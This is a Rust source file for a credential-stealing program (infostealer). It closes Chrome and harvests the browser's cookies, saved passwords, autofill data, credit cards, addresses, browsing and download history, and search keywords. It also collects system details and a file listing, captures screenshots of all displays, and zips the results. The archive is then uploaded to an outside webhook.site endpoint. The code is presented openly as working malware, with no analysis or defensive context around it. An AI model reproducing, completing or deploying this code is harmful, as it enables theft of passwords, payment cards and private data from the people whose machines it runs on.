mod chrome;
mod structs;
mod system;
mod utils;

use json::{object, JsonValue};
use reqwest;
use screenshots::Screen;
use std::fs;
use std::path::PathBuf;
use system::{
    get_audio_info, get_cpu_info, get_disk_info, get_display_info, get_files, get_gpu_info,
    get_network_info, get_os_info, get_ram_info,
};
use chrome::{
    get_addresses_data, get_autofill_data, get_cookies_data, get_credit_cards_data,
    get_download_history_data, get_history_data, get_keywords_data, get_passwords_data,
};
use winapi;

fn get_desktop_background_path() -> String {
    unsafe {
        let buffer: [u16; 260] = std::mem::zeroed();

        let return_code = winapi::um::winuser::SystemParametersInfoW(
            winapi::um::winuser::SPI_GETDESKWALLPAPER,
            buffer.len() as u32,
            buffer.as_ptr() as *mut winapi::ctypes::c_void,
            0,
        );

        if return_code == 0 {
            return String::new();
        }

        let path = String::from_utf16(&buffer)
            .unwrap_or_default()
            .trim_end_matches('\x00')
            .into();

        path
    }
}

fn upload_file(file_path: &str) -> Result<(), Box<dyn std::error::Error>> {
    let client = reqwest::blocking::Client::new();
    let mut headers = reqwest::header::HeaderMap::new();

    let userhash = "##########".to_string();
    let reqtype = "fileupload".to_string();
    let url = "https://webhook.site/sample-uuid";
    let file_name = file_path.split("/").last().unwrap_or_default();

    headers.insert(
        reqwest::header::USER_AGENT,
        reqwest::header::HeaderValue::from_static("reqwest"),
    );

    let file = fs::read(file_path)?;
    let part = reqwest::blocking::multipart::Part::bytes(file).file_name(file_name.to_owned());

    let form = reqwest::blocking::multipart::Form::new()
        .text("reqtype", reqtype)
        .text("userhash", userhash)
        .part("fileToUpload", part);

    println!("Uploading file: {}", file_name);

    client.post(url).headers(headers).multipart(form).send()?;

    Ok(())
}

fn take_screenshot() -> Result<Vec<String>, Box<dyn std::error::Error>> {
    let screens = Screen::all()?;
    let mut paths = Vec::new();

    for screen in screens {
        let image = screen.capture()?;
        image.save(format!("{}.png", screen.display_info.id))?;

        paths.push(format!("{}.png", screen.display_info.id));
    }

    Ok(paths)
}

fn take_picture() -> Result<String, Box<dyn std::error::Error>> {
    // TODO
    Ok("".to_string())
}

fn get_chrome_data() -> JsonValue {
    let _ = utils::close_chome();

    let chrome_path = utils::get_chrome_path();
    let chrome_default_path = chrome_path.join("Default");
    let cookies_path = chrome_default_path.join("Network").join("Cookies");
    let login_data_path = chrome_default_path.join("Login Data");
    let web_data_path = chrome_default_path.join("Web Data");
    let history_path = chrome_default_path.join("History");

    let chrome_data = object! {
        "cookies": get_cookies_data(&cookies_path),
        "passwords": get_passwords_data(&login_data_path),
        "autofill": get_autofill_data(&web_data_path),
        "credit_cards": get_credit_cards_data(&web_data_path),
        "addresses": get_addresses_data(&web_data_path),
        "history": get_history_data(&history_path),
        "download_history": get_download_history_data(&history_path),
        "keywords": get_keywords_data(&history_path),
    };

    chrome_data
}

fn get_system_info() -> JsonValue {
    let data = object! {
        "os": get_os_info(),
        "cpu": get_cpu_info(),
        "gpu": get_gpu_info(),
        "ram": get_ram_info(),
        "disk": get_disk_info(),
        "display": get_display_info(),
        "network": get_network_info(),
        "audio": get_audio_info(),
        "files": get_files(),
    };

    data
}

fn main() {
    let data = get_system_info();
    let chrome_data = get_chrome_data();

    utils::save_data(&data, "data.json").unwrap_or_default();
    utils::save_data(&chrome_data, "chrome_data.json").unwrap_or_default();

    let photo_path = take_picture().unwrap();
    let desktop_background_path = get_desktop_background_path();
    let screenshot_paths = take_screenshot().unwrap_or_default();

    let mut files_to_archive = Vec::new();
    files_to_archive.push("data.json".to_string());
    files_to_archive.push("chrome_data.json".to_string());
    files_to_archive.push(desktop_background_path.clone());
    files_to_archive.push(photo_path.clone());

    for path in screenshot_paths.clone() {
        files_to_archive.push(path);
    }

    let archive_path = PathBuf::from("archive.zip");
    let archive_result =
        utils::archive_files(&utils::strings_to_paths(files_to_archive), &archive_path);

    match archive_result {
        Ok(_) => {
            println!("Uploading files...");

            match upload_file(archive_path.to_str().unwrap_or_default()) {
                Ok(_) => {
                    println!("Files uploaded successfully!");
                }
                Err(err) => {
                    println!("Error uploading files: {}", err);
                }

            }
        }
        Err(err) => {
            println!("Error archiving files: {}", err);
        }
    }
}
